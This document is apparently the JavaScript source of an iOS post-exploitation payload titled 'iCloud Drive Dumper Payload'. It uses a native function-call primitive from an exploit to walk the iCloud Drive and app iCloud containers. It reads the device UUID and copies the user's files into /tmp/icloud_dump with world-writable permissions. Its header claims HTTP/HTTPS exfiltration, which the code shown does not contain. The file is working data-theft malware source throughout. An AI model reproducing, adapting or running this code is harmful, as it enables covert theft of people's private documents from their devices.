// iCloud Drive Dumper Payload
// Runs under UserEventAgent process which has access to iCloud Drive files
// Extracts and sends iCloud Drive files via HTTP/HTTPS

class Native {
	
	static #baseAddr;
	static #dlsymAddr;
	static #memcpyAddr;
	static #mallocAddr;
	static #oinvAddr;
	
	static mem = 0n;
	static memSize = 0x4000;
	
	static #argMem = 0n;
	static #argMemPtr = 0n;
	static #argMemPtrStr = 0n;
	static #argPtr = 0n;
	static #argPtrPtr = 0n;
	static #argPtrStrPtr = 0n;

	static #dlsymCache = {};
	
	static init() {
		const buff = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = buff[20];
		this.#dlsymAddr = buff[21];
		this.#memcpyAddr = buff[22];
		this.#mallocAddr = buff[23];
		this.#oinvAddr = buff[24];
		
		this.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));
		this.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argPtr = this.#argMem;
		this.#argPtrPtr = this.#argMemPtr;
		this.#argPtrStrPtr = this.#argMemPtrStr;
	}
	
	static write(ptr, buff) {
		if (!ptr) return false;
		let buff8 = new Uint8Array(nativeCallBuff);
		let offs = 0;
		let left = buff.byteLength;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			buff8.set(new Uint8Array(buff, offs, len), 0x1000);
			this.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));
			left -= len;
			offs += len;
		}
		return true;
	}
	
	static read(ptr, length) {
		if (!ptr) return null;
		let buff = new ArrayBuffer(length);
		let buff8 = new Uint8Array(buff);
		let offs = 0;
		let left = length;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));
			buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
			left -= len;
			offs += len;
		}
		return buff;
	}
	
	static readPtr(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}
	
	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getInt32(0, true);
	}
	
	static write64(ptr, value) {
		const buff = new ArrayBuffer(8);
		const view = new DataView(buff);
		view.setBigUint64(0, value, true);
		this.write(ptr, buff);
	}
	
	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}
	
	static writeString(ptr, str) {
		const buff = this.stringToBytes(str, true);
		this.write(ptr, buff);
	}
	
	static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);
		this.#argPtr = this.#argMem;
		return ret;
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i])
				break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}
	
	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated)
			s8[str.length] = 0x0;
		return s8.buffer;
	}
	
	static #toNative(value) {
		if (!value)
			return 0n;
		if (typeof value === 'string') {
			if (value.length >= 0x1000) {
				return 0n;
			}
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return ptr;
		}
		else if (typeof value === 'bigint') {
			return value;
		}
		else
			return BigInt(value);
	}

	static #dlsym(name) {
		if (!name)
			return 0n;
		let addr = this.#dlsymCache[name];
		if (addr)
			return addr;
		const RTLD_DEFAULT = 0xfffffffffffffffen;
		const nameBytes = this.stringToBytes(name, true);
		let buff8 = new Uint8Array(nativeCallBuff);
		buff8.set(new Uint8Array(nameBytes), 0x1000);
		addr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
		if (addr)
			this.#dlsymCache[name] = addr;
		return addr;
	}
	
	static #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {
		let buff = new BigInt64Array(nativeCallBuff);
		
		buff[0] = addr;
		buff[100] = x0;
		buff[101] = x1;
		buff[102] = x2;
		buff[103] = x3;
		buff[104] = x4;
		buff[105] = x5;
		buff[106] = x6;
		buff[107] = x7;

		invoker();
		
		return buff[200];
	}
	
	static #nativeCallSymbol(name, ...args) {
		const funcAddr = this.#dlsym(name);
		const ret64 = this.#nativeCallAddr(funcAddr, ...args);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn)
			return Number(ret64);
		return ret64;
	}
}

// ============================================================================
// Configuration
// ============================================================================

const TAG = "INFO";

const DEST_DIR = "/tmp/icloud_dump";
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit per file
const CHUNK_SIZE = 64 * 1024;

// ============================================================================
// Helper Functions
// ============================================================================

function getDeviceUUID() {
	try {
		const CTL_HW = 6;
		const HW_UUID = 25;
		
		const mib = new ArrayBuffer(4 * 2);
		const mibView = new DataView(mib);
		mibView.setInt32(0, CTL_HW, true);
		mibView.setInt32(4, HW_UUID, true);
		
		const mibBuf = Native.callSymbol("malloc", 8);
		if (!mibBuf || mibBuf === 0n) {
			return "unknown-device";
		}
		
		const resultBuf = Native.callSymbol("malloc", 256);
		if (!resultBuf || resultBuf === 0n) {
			Native.callSymbol("free", mibBuf);
			return "unknown-device";
		}
		
		const lengthBuf = Native.callSymbol("malloc", 8);
		if (!lengthBuf || lengthBuf === 0n) {
			Native.callSymbol("free", mibBuf);
			Native.callSymbol("free", resultBuf);
			return "unknown-device";
		}
		
		try {
			Native.write(mibBuf, mib);
			
			const lengthView = new DataView(new ArrayBuffer(8));
			lengthView.setUint32(0, 256, true);
			lengthView.setUint32(4, 0, true);
			Native.write(lengthBuf, lengthView.buffer);
			
			let ret = Native.callSymbol("sysctl", mibBuf, 2, 0n, lengthBuf, 0n, 0);
			if (ret !== 0) {
				return "unknown-device";
			}
			
			const lengthData = Native.read(lengthBuf, 8);
			if (!lengthData) {
				return "unknown-device";
			}
			const lengthView2 = new DataView(lengthData);
			const length = lengthView2.getUint32(0, true);
			
			if (length <= 0 || length > 256) {
				return "unknown-device";
			}
			
			lengthView.setUint32(0, length, true);
			Native.write(lengthBuf, lengthView.buffer);
			
			ret = Native.callSymbol("sysctl", mibBuf, 2, resultBuf, lengthBuf, 0n, 0);
			if (ret !== 0) {
				return "unknown-device";
			}
			
			const rawData = Native.read(resultBuf, length);
			if (!rawData) {
				return "unknown-device";
			}
			
			const bytes = new Uint8Array(rawData);
			let uuid = "";
			
			for (let i = 0; i < bytes.length && i < length; i++) {
				const byte = bytes[i];
				if (byte === 0) {
					break;
				}
				if ((byte >= 32 && byte <= 126) || byte === 45 || byte === 58) {
					uuid += String.fromCharCode(byte);
				}
			}
			
			uuid = uuid.trim();
			
			if (uuid && uuid.length > 0) {
				return uuid;
			}
		} finally {
			Native.callSymbol("free", mibBuf);
			Native.callSymbol("free", resultBuf);
			Native.callSymbol("free", lengthBuf);
		}
	} catch (e) {
		// Ignore
	}
	
	return "unknown-device";
}

function getFileSize(filePath) {
	try {
		const statBuf = Native.callSymbol("malloc", BigInt(144));
		if (!statBuf || statBuf === 0n) {
			return -1;
		}
		
		try {
			const statResult = Native.callSymbol("stat", filePath, statBuf);
			if (statResult !== 0) {
				return -1;
			}
			
			const statData = Native.read(statBuf, 144);
			const statView = new DataView(statData);
			const fileSize = Number(statView.getBigUint64(0x60, true));
			
			return fileSize;
		} finally {
			Native.callSymbol("free", statBuf);
		}
	} catch (e) {
		return -1;
	}
}

function fileExists(filePath) {
	const accessResult = Native.callSymbol("access", filePath, 0);
	return Number(accessResult) === 0;
}

function readDirentName(entry) {
	const direntData = Native.read(entry, 280);
	if (!direntData || direntData.length < 21) {
		return "";
	}
	
	const direntView = new DataView(direntData);
	const d_namlen = direntView.getUint16(18, true);
	
	if (d_namlen > 0 && d_namlen < 256) {
		const namePtr = entry + 21n;
		const name = Native.readString(namePtr, d_namlen).replace(/\0/g, '').trim();
		if (name.length > 0 && name.charCodeAt(0) >= 0x20 && name.charCodeAt(0) <= 0x7E) {
			return name;
		}
	}
	
	const namePtr21 = entry + 21n;
	let name = Native.readString(namePtr21, 256).replace(/\0/g, '').trim();
	
	while (name.length > 0 && name.charCodeAt(0) >= 1 && name.charCodeAt(0) <= 31) {
		name = name.substring(1);
	}
	
	return name.trim();
}

function listFilesRecursive(dirPath, maxDepth, currentDepth) {
	const files = [];
	if (currentDepth > maxDepth) return files;
	
	const dir = Native.callSymbol("opendir", dirPath);
	if (!dir || dir === 0n) return files;
	
	try {
		while (true) {
			const entry = Native.callSymbol("readdir", dir);
			if (!entry || entry === 0n) break;
			
			const name = readDirentName(entry);
			if (!name || name.length === 0 || name === "." || name === "..") continue;
			
			const fullPath = dirPath + "/" + name;
			
			const statBuf = Native.callSymbol("malloc", 144);
			if (!statBuf || statBuf === 0n) continue;
			
			try {
				const ret = Native.callSymbol("stat", fullPath, statBuf);
				if (ret !== 0) continue;
				
				const statData = Native.read(statBuf, 144);
				const statView = new DataView(statData);
				const mode = statView.getUint16(4, true);
				
				const isDir = (mode & 0xF000) === 0x4000;
				const isFile = (mode & 0xF000) === 0x8000;
				
				if (isFile) {
					const size = Number(statView.getBigUint64(96, true));
					files.push({ path: fullPath, size: size });
				} else if (isDir) {
					const subFiles = listFilesRecursive(fullPath, maxDepth, currentDepth + 1);
					for (const f of subFiles) {
						files.push(f);
					}
				}
			} finally {
				Native.callSymbol("free", statBuf);
			}
		}
	} finally {
		Native.callSymbol("closedir", dir);
	}
	
	return files;
}

/**
 * Copy a file from src to dst with specified permissions
 */
function copyFile(srcPath, dstPath, mode) {
	try {
		if (!fileExists(srcPath)) {
			return false;
		}
		
		const fileSize = getFileSize(srcPath);
		if (fileSize < 0) {
			return false;
		}
		
		if (fileSize === 0) {
			return false;
		}
		
		if (fileSize > MAX_FILE_SIZE) {
			return false;
		}
		
		const srcFd = Native.callSymbol("open", srcPath, 0);
		if (Number(srcFd) < 0) {
			return false;
		}
		
		try {
			const dstFd = Native.callSymbol("open", dstPath, 0x601, mode);
			if (Number(dstFd) < 0) {
				return false;
			}
			
			try {
				const chunkSize = 64 * 1024;
				let totalCopied = 0;
				
				while (totalCopied < fileSize) {
					const remaining = fileSize - totalCopied;
					const toRead = remaining > chunkSize ? chunkSize : remaining;
					
					const buf = Native.callSymbol("malloc", BigInt(toRead));
					if (!buf || buf === 0n) break;
					
					try {
						const bytesRead = Native.callSymbol("read", srcFd, buf, toRead);
						if (Number(bytesRead) <= 0) break;
						
						const bytesWritten = Native.callSymbol("write", dstFd, buf, Number(bytesRead));
						if (Number(bytesWritten) <= 0) break;
						
						totalCopied += Number(bytesWritten);
					} finally {
						Native.callSymbol("free", buf);
					}
				}
				
				Native.callSymbol("chmod", dstPath, mode);
				
				return totalCopied > 0;
				
			} finally {
				Native.callSymbol("close", dstFd);
			}
		} finally {
			Native.callSymbol("close", srcFd);
		}
		
	} catch (e) {
		return false;
	}
}

/**
 * Create directory if it doesn't exist
 */
function ensureDirectoryExists(dirPath) {
	const statBuf = Native.callSymbol("malloc", 144);
	if (!statBuf || statBuf === 0n) return false;
	
	try {
		const statResult = Native.callSymbol("stat", dirPath, statBuf);
		if (statResult === 0) {
			return true;
		}
		
		Native.callSymbol("mkdir", dirPath, 511);
		const mkdirResult = Native.callSymbol("stat", dirPath, statBuf);
		return mkdirResult === 0;
	} finally {
		Native.callSymbol("free", statBuf);
	}
}


/**
 * Download iCloud Drive files
 */
function getiCloudDriveFiles() {
	const icloudFiles = [];
	const icloudBasePath = "/private/var/mobile/Library/Mobile Documents";
	
	// Check if iCloud Drive is accessible
	if (!fileExists(icloudBasePath)) {
		return icloudFiles;
	}
	
	// Main iCloud Drive folder
	const icloudDrivePath = icloudBasePath + "/com~apple~CloudDocs";
	
	if (fileExists(icloudDrivePath)) {
		const files = listFilesRecursive(icloudDrivePath, 10, 0);
		
		for (const file of files) {
			if (file.size > MAX_FILE_SIZE) continue;
			if (file.size === 0) continue;
			
			const relativePath = file.path.substring(icloudDrivePath.length + 1);
			const uniqueName = "CloudDocs_" + relativePath.replace(/\//g, '_');
			
			icloudFiles.push({
				path: file.path,
				filename: uniqueName,
				category: "icloud-drive",
				description: "iCloud Drive"
			});
		}
	}
	
	// Scan all iCloud folders
	const mobileDocsDir = Native.callSymbol("opendir", icloudBasePath);
	if (mobileDocsDir && mobileDocsDir !== 0n) {
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", mobileDocsDir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				if (name === "com~apple~CloudDocs") continue;
				
				if (name.indexOf("~") !== -1) {
					const appICloudPath = icloudBasePath + "/" + name;
					const files = listFilesRecursive(appICloudPath, 10, 0);
					
					let category = "icloud-app";
					if (name.indexOf("iCloud~") === 0) {
						category = "icloud-app";
					} else if (name.indexOf("com~apple~") === 0) {
						category = "icloud-apple";
					} else {
						category = "icloud-other";
					}
					
					for (const file of files) {
						if (file.size > MAX_FILE_SIZE) continue;
						if (file.size === 0) continue;
						
						const relativePath = file.path.substring(icloudBasePath.length + 1);
						const parts = relativePath.split('/');
						const containerName = parts[0] || "";
						const restPath = parts.slice(1).join('_').replace(/\//g, '_');
						const uniqueName = containerName + "_" + restPath;
						
						icloudFiles.push({
							path: file.path,
							filename: uniqueName,
							category: category,
							description: "iCloud - " + name
						});
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", mobileDocsDir);
		}
	}
	
	return icloudFiles;
}

// ============================================================================
// Main Execution
// ============================================================================

Native.init();

// Create destination directory
if (!ensureDirectoryExists(DEST_DIR)) {
} else {
	Native.callSymbol("chmod", DEST_DIR, 511);
}

// Extract iCloud files
const icloudFiles = getiCloudDriveFiles();

let successCount = 0;
let failCount = 0;
let skipCount = 0;

for (let i = 0; i < icloudFiles.length; i++) {
	const icloudFile = icloudFiles[i];
	
	// Create destination path preserving relative structure
	const relativePath = icloudFile.filename || icloudFile.path.substring(icloudFile.path.lastIndexOf('/') + 1);
	const dstPath = DEST_DIR + "/" + relativePath;
	
	// Ensure parent directory exists
	const lastSlash = dstPath.lastIndexOf('/');
	if (lastSlash > DEST_DIR.length) {
		const parentDir = dstPath.substring(0, lastSlash);
		ensureDirectoryExists(parentDir);
		Native.callSymbol("chmod", parentDir, 511);
	}
	
	// Copy file with 777 permissions
	if (copyFile(icloudFile.path, dstPath, 511)) {
		successCount++;
	} else {
		failCount++;
	}
}

